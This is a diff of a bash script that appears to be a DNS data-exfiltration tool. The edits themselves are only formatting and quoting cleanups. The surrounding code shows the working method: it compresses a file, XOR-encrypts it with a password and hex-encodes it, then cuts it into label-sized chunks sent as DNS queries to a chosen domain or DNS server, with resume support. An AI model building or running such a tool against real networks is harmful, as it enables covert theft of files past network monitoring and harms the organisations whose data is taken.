@@ -19,15 +19,19 @@ function show_help {
 
 while getopts "f:p:d:s:th" opt; do
     case ${opt} in
-        f ) FilePath=$OPTARG ;;
-        p ) Password=$OPTARG ;;
-        d ) Domain=$OPTARG ;;
-        s ) DnsServerIp=$OPTARG ;;
-        t ) UseTcp=true ;;
-        h ) show_help
-            exit 0 ;;
-        \? ) show_help
-             exit 1 ;;
+    f) FilePath=$OPTARG ;;
+    p) Password=$OPTARG ;;
+    d) Domain=$OPTARG ;;
+    s) DnsServerIp=$OPTARG ;;
+    t) UseTcp=true ;;
+    h)
+        show_help
+        exit 0
+        ;;
+    \?)
+        show_help
+        exit 1
+        ;;
     esac
 done
 
@@ -35,7 +39,6 @@ if [[ -z "$FilePath" || -z "$Password" || ! -f "$FilePath" ]]; then
     show_help
     exit 1
 fi
-
 
 echo "       __                     _____ __         ___            __ "
 echo "  ____/ /___  ________  _  __/ __(_) /   _____/ (_)__  ____  / /_"
@@ -53,16 +56,16 @@ filename=$(basename "$FilePath")
 status_file="${filename}_transfer_status.log"
 
 # Calculate MD5 checksum
-md5_checksum=($(md5sum $FilePath))
+md5_checksum=$(md5sum "$FilePath" | awk '{ print $1 }')
 echo "[+] MD5 checksum: [$md5_checksum $FilePath]"
-randnum=$(cat /dev/urandom | tr -dc '0-9' | head -c 7)
+randnum=$(tr -dc '0-9' < /dev/urandom | head -c 7)
 
 chunk_id=0
 
 # Check if status file exists
 if [ -f "$status_file" ]; then
-    echo "[!] A previous transfer was interrupted: $(cat $status_file)"
-    read -p "[?] Do you want to resume the transfer? (yes/no): " resume
+    echo "[!] A previous transfer was interrupted: $(cat "$status_file")"
+    read -rp "[?] Do you want to resume the transfer? (yes/no): " resume
     if [ "$resume" != "yes" ]; then
         rm -f "$status_file"
     else
@@ -79,15 +82,14 @@ fi
 
 echo "[*] Encrypting file, please wait..."
 # XOR encrypt compressed data with password
-encrypted_data=$(gzip -c "$FilePath" | xortool-xor -n -s "$Password" -f - | hexdump -v -e '/1 "%02x"' )
+encrypted_data=$(gzip -c "$FilePath" | xortool-xor -n -s "$Password" -f - | hexdump -v -e '/1 "%02x"')
 
 # Maximum DNS query size constraints
-chunk_max_size=63
 request_max_size=255
 
 # Calculate space required for domain name and metadata
 domain_name_length=$((${#Domain} + 3)) #including the dots
-encrypted_filename=$(echo -n "$filename" | xortool-xor -n -s "$Password" -f - | xxd -p )
+encrypted_filename=$(echo -n "$filename" | xortool-xor -n -s "$Password" -f - | xxd -p)
 metadata_length=$((${#encrypted_filename} + 23)) #including the dots, and the metadata separators, Maximum of 100000 chunks = 20 MB
 
 # Calculate maximum bytes available for data in each DNS query
@@ -112,10 +114,10 @@ while [[ $chunk_id -lt $nb_chunks ]]; do
     chunk=${encrypted_data:$start_index:chunks_bytes}
 
     # Split chunk into 4 equal chunks
-    chunk_length=$(((${#chunk} + 3) / 4))
+    chunk_length=$(((${#chunk} + 3) / 4)) #chunk_max_size=63
     chunks=()
     for ((i = 0; i < 4; i++)); do
-        chunks[$i]=${chunk:$((i * chunk_length)):chunk_length}
+        chunks[i]=${chunk:$((i * chunk_length)):chunk_length}
     done
 
     # Construct DNS query
@@ -144,8 +146,8 @@ while [[ $chunk_id -lt $nb_chunks ]]; do
 
     # Update status file
     status=$(jq -n --arg chunk_id "$chunk_id" --arg randnum "$randnum" --arg file "$filename" --arg md5_checksum "$md5_checksum" \
-                 '{chunk_id: $chunk_id, randnum: $randnum, file: $file, md5_checksum: $md5_checksum}')
-    echo "$status" > "$status_file"
+        '{chunk_id: $chunk_id, randnum: $randnum, file: $file, md5_checksum: $md5_checksum}')
+    echo "$status" >"$status_file"
 
     if [[ $success == false ]]; then
         echo "[!] Failed to send DNS query after multiple retries."
